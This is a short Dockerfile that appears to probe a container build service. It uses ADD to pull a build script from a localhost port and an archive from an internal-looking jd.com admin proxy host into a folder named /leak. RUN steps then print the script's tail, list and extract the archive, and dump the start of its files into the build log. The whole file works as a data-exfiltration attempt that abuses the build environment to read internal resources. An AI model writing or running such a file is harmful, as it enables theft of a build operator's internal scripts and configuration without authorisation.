FROM scratch
ADD rootfs.tar /
ADD http://127.0.0.1:8082/script/build-dockerfile /leak/skywing.txt
RUN /bin/sh -c 'N=LEAK3_0926_0030; echo "[MARK] $N"; echo "[SIZE]"; wc -c /leak/skywing.txt; echo "[FULL-SCRIPT-PART2]"; tail -c 11000 /leak/skywing.txt; echo "[END-PART2]"'
ADD http://storage-jd-local-jcloud-admin.proxy.jd.com/compile-build/cg.tgz /leak/cg.tgz
RUN /bin/sh -c 'echo "[CFGGEN-LS]"; ls -la /leak; echo "[CFGGEN-TARLIST]"; busybox tar tzf /leak/cg.tgz 2>&1 | head -60; echo "[CFGGEN-EXTRACT]"; mkdir -p /leak/cg && busybox tar xzf /leak/cg.tgz -C /leak/cg 2>&1; find /leak/cg -type f 2>&1 | head -40; echo "[CFGGEN-CAT]"; for f in $(find /leak/cg -type f | head -12); do echo "=== $f ==="; head -c 1500 "$f"; echo; done; echo "[END] $N"'
ENTRYPOINT ["/bin/sh","-c"]
